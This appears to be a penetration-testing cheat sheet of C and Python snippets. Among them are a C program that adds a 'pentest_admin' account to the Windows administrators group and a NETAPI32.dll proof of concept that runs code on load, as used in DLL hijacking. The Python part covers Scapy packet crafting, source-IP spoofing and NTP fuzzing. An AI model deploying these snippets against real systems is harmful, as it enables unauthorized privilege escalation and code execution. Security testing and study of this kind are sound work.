# PROGRAMMING

1. [C](#c)
2. [Python](#python)

## C 

### Add user to administrator group in C
```c
//i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
#include <stdlib.h>
int main ()
{
	int i;
	i = system("net localgroup administrators pentest_admin /add");
	return 0;
}
```

### Created DLL to launch calc.exe

```c
//i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL NETAPI32.cpp
//i686-w64-mingw32-g++ -shared -o NETAPI32.dll NETAPI32.o -Wl,--out-implib,NETAPI32.a
//to test it : 
//RUNDLL32.EXE <dllname>,<entrypoint> <optional arguments> : rundll32 NETAPI32.dll, callme
#include <windows.h>
int callme()
{
	WinExec("calc", 0);
	return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
	callme();
	return 0;
}
```


## PYTHON 

### SIMPLE HTTP SERVER

```python
python -m SimpleHTTPServer 8080
python -m http.server 8000
```

### SIMPLE HTTPS SERVER

```python
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:4443

import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

### SCAPY

When you craft TCP packets with Scapy, the underlying OS will not recognize the initial SYN packet and will reply with a RST packet. To mitigate this you need to set the following Iptables rule: 
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

### Imports all scapy libraries
```python
from scapy.all import * 
```

### List all avaiable protocols
```python
ls() 
```

### List all scapy functions
```python
lsc() 
```

### Show/set scapy config
```python
conf 
```

### Generate random src IPs
```python
IP(src=RandIP()) 
```

### Generate random src MACs
```python
Ether(src=RandMAC()) 
```

### Specify IP parameters
```python
ip=IP(src="1.1.1.1",dst="2.2.2.2") 
```

### Specify TCP parameters
```python
tcp=TCP(dport="443") 
```

### Specify data portion
```python
data="TCP data" 
```

### Create IP()/TCP() packet
```python
packet=ip/tcp/data 
```

### Display packet configuration
```python
packet.show() 
```

### Send 1 packet @ layer 3
```python
send(packet,count=1) 
```

### Send 2 packets @ layer 2
```python
sendp(packet,count=2) 
```

### Send faster using tcpreply
```python
sendpfast(packet) 
```

### Send 1 packet & get replies
```python
sr(packet) 
```

### Send only return 1st reply
```python
sr1(packet) 
```

### Send packet- 1000 times
```python
for i in range(0,1000): send(<packet>) 
```

### Sniff 100 packets on ethO
```python
sniff(count=100,iface=eth0) 
```

### SEND IPv6 ICMP MSG
```python
sr(IPv6(src="<ipv6>", dst="<ipv6>")/ICMP())
```

### UDP PACKET W/ SPECIFIC PAYLOAD:

```python
ip=IP(src="<ip>", dst="<ip>")
u=UDP(dport=1234, sport=5678)
pay = "my UDP packet"
packet=ip/u/pay
packet.show()
wrpcap("out.pcap",packet): write to pcap
send(packet)
```

### NTP FUZZER

```python
packet=IP(src="<ip>",dst="<ip>")/UDP(dport=123)/fuzz(NTP(version=4,mode=4))
```

### SEND HTTP MESSAGE

```python
from scapy.all import *
# Add iptables rule to block attack box from sending RSTs
# Create web.txt with entire GET/POST packet data
fileweb = open("web.txt",'r')
data = fileweb.read()
ip = IP(dst="<ip>")
SYN=ip/TCP(rport=RandNum(6000,7000),dport=80,flags="S",seq=4)
SYNACK = sr1(SYN)
ACK=ip/TCP(sport=SYNACK.dport,dport=80,flags="A",seq=SYNACK.ack,ack=SYNACK.seq+1)/data
reply,error = sr(ACK)
print reply.show()
```

